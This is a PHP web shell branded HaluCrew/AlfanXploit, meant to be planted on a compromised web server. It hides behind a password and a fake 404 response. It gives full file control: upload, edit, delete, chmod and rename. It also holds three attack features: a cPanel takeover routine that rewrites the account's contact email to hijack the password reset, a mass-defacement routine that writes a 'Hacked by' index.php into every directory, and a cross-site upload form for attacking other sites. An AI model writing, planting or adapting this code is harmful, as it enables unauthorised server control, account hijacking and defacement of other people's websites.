<?php 
// Priv Shell 
// Silence Because Yourself

error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "dalem sayang";
$link = "fvck.txt";
if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location='?./AlfanXploit'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?./AlfanXploit'</script>";
}
if(!($_SESSION['forbidden'])) {
?>
<title>Shell ./AlfanXploit</title>
<meta name="theme color" content="black"> </meta>
<link href="https://fonts.googleapis.com/css?family=Patrick+Hand" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Oxanium&display=swap" rel="stylesheet">

<html>
<head>
	<title>WELCOME COK</title>
</head>
<style>
	input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<body bgcolor="black">
	<center><img src="https://i.ibb.co/jy902K1/20210319-194527.jpg" style="opacity:0.5; width:300px; height:300px";></center>
	<center><h1><center><font color="red" face="Patrick Hand">-=[ HaluCrew</font><font color="white" face="Patrick Hand"> Shell ]=-</font><br>
</center>


	<form method="post">
		<input type="password" name="password" placeholder="Password">
      <input type="submit" value="Entot Cok!">
		<br>
		<br>
		<?php echo $_SESSIOM['forbidden']; ?>
	    </form>
	  </td>
	 </table>

<?php 

exit();
}
 ?>
<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link rel="SHORTCUT ICON" href="https://i.ibb.co/jy902K1/20210319-194527.jpg">
<DIV align=center><IMG src="https://i.ibb.co/jy902K1/20210319-194527.jpg" width=500 height=300><br>
<audio autoplay> <source src="http://www.soundescapestudios.com/SESAudio/SES%20Site%20Sounds/Beeps/Beeps-short-01.wav" type="audio/mpeg"></audio>
<center><font color="red" face="Papyrus"><font color="#47FF0F" face="Papyrus"></font></footer></tr></table>
</style>
<link href="https://fonts.googleapis.com/css?family=Walter+Turncoat" rel="stylesheet">
<title>HaluCrew MiniShell</title>

<style>
body{
font-family: "Kelly Slab"; cursive ;background-color:#000;
color:red;
}
#content tr:hover{
background-color: #2b282b;
text-shadow:0px 0px 10px #ffffff;
}

#content .first{
background-color: #191919;
}
table{
border: 1px #191919 dotted ;
}
.destroy_table {;
  background:#191919;
  border:1px solid #000;
  font-family:Kelly Slab;
    display:inline-block;
  cursor:pointer;
  color:lime;
  font-size:17x;
  padding:3px 20px;
  text-decoration:white;
  text-shadow:0px 0px 0px #ff0505;
       }
a{
color:white;
text-decoration: none;
}
a:hover{
color:white;
text-shadow:0px 0px 10px #FFFFFF;
}
input,select,textarea{
border: 3px black solid;font-family:kelly slab;background-color:#191919;color:lime;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
border-radius: 6px;
} .blink_text { -webkit-animation-name: blinker; -webkit-animation-duration: 2s; -webkit-animation-timing-function: linear; -webkit-animation-iteration-count: infinite; -moz-animation-name: blinker; -moz-animation-duration: 2s; -moz-animation-timing-function: linear; -moz-animation-iteration-count: infinite; animation-name: blinker; animation-duration: 2s; animation-timing-function: linear; animation-iteration-count: infinite; color: red; } @-moz-keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } @-webkit-keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } @keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } 
</style>
</style>
<style>
body{
background: url(https://gifimage.net/wp-content/uploads/2017/09/background-website-keren-gif.gif) no-repeat center center fixed; #fff;
-webkit-background-size: 100% 100%;
}
</style>
</head>
<body>
<table width="700" border="5" cellpadding="5" cellspacing="5" align="center">

<tr><td><font color="lime">Your Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="lime"> Berhasil Cok! </font><br />';
}else{
echo '<font color="red"> Gagal Mank </font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="lime">Select Your File :</font> <input type="file" name="file" />
<input type="submit" value="Upload" />
</form>
</td></tr>';
echo "<center>";
echo "<center><table id='menu' width='700' border='0' cellpadding='5' cellspacing='5' align='center'><tr><td>";
echo "<center><a class='destroy_table' href='?'>Home</a>";
echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=cmd'>Crack_Cpanel</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=mass'>Mass_deface</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=csrf'>Csrf</a>";
echo "</center>";
if($_GET['do'] == 'cmd') {
	echo'<header> 
	<pre><br><center><font face="kelly slab" size="3" color="lime">Cpanel Reset Password</pre> 
	</header></center>
	<center>
	<form action="#" method="post"> 	 <input type="email" name="email" style=color:lime;background-color:#191919;font-family:kelly slab;  value="Email lu mank" /> 	 <input type="submit" name="submit" style=color:lime;background-color:#191919;font-family:kelly slab;  value="Crack"/></center>
	</form> 	 	 
	<br/>
	</p>'; ?> <?php $IIIIIIIIIIII = get_current_user(); $IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; $IIIIIIIIIIlI = getenv('REMOTE_ADDR'); if (isset($_POST['submit'])) { $email = $_POST['email']; $IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; $IIIIIIIIIlI1 = "2083"; $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1'; $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo'); if(!$read_named_conf) { echo "<h1>Kurang Hoki:(</h1>
	</pre>
	</center>"; } else { echo "<center>Salin Usernamenya Mamank<br>
	</center>"; echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Salin User</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Gassken Yahaha Hayyuk</a><br><br></center>'; ;}}
	echo '</td></tr><tr><td>';
	 die();
} elseif($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}
if ($_GET['to'] == "mass") {
        if (isset($_POST['base_dir'])) {
            if (!file_exists($_POST['base_dir']))
                die($_POST['base_dir'] . " Not Found !<br>");

            if (!is_dir($_POST['base_dir']))
                die($_POST['base_dir'] . " Is Not A Directory !<br>");

            @chdir($_POST['base_dir']) or die("Cannot Open Directory");

            $files = @scandir($_POST['base_dir']) or die("Kontlo wkwkw<br>");

            foreach ($files as $file) :
                if ($file != "." && $file != ".." && @filetype($file) == "dir") {
                    $index = getcwd() . "/" . $file . "/" . $_POST['andela'];
                    if (file_put_contents($index, $_POST['index']))
                        echo "<hr color='white'><font color='black'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font>";
                }
            endforeach;
        }
        echo "<center><form method='POST'>";
        echo "
    <br><font color='white'>Target Folder</font><br>
    <input cols='7' rows='7' type='text' style='color:lime;background-color:#191919;font-family:kelly slab' name='base_dir' value='" . getcwd() . "'><br><br>";
        echo "<font color='white' face='kelly slab'>Name of File</font><br><input cols='7' rows='7' type='text' style='color:lime;background-color:#191919;font-family:kelly slab' name='andela' value='index.php'><br><br>";
        echo "<font color='white'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#191919;font-family:kelly slab' name='index'>Hacked by HsxQxX7</textarea><br>";
        echo "<input type='submit' style='color:lime;background-color:#191919;font-family:kelly slab' value='Kentot'></form></center>";
        die();
    }
if ($_GET['do'] == "csrf") {
    echo '<br>
<center><form method="post">
<font color=white>URL / LINK : </font><input type="text" name="url" size="50" height="10"  style=color:lime;background-color:#191919;font-family:kelly slab;  value="http://www.target.co.il/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br><br>
<font color=white>POST File : </font><input type="text" name="pf" size="50" height="10" style=color:lime;background-color:#191919;font-family:kelly slab; value="Filedata / files[] / qqfile / userfile / dll" style="margin: 5px auto; padding-left: 5px;" required><br>
<br><input type="submit" name="n7" style=color:lime;background-color:#191919;font-family:kelly slab; value="Lock Target">
</form>';
    $url = $_POST['url'];
    $pf = $_POST['pf'];
    $d = $_POST['n7'];
    if ($d) {
        echo "<br><form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form>";
    }
        die();
}

if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">Change Permission Berhasil </font><br/>';
}else{
echo '<font color="red">Change Permission Gagal </font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="lime">Sukses ganti nama mamank</font><br/>';
}else{
echo '<font color="red">Gagal ganti nama mank </font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">Berhasil Edit File </font><br/>';
}else{
echo '<font color="red">Gagal Edit File </font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="lime">Sukses hapus directory</font><br/>';
}else{
echo '<font color="red">Gagal hapus directory                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="lime">Berhasil hapus file mank</font><br/>';
}else{
echo '<font color="red">Gagal hapus file mank</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="white">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<font face="Kelly Slab" color="white" size="2px"><center><br/><b>Copyright &copy; 2K20 <font color="lime">./AlfanXploit</a></center></font>

</body>
</html>
';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?> 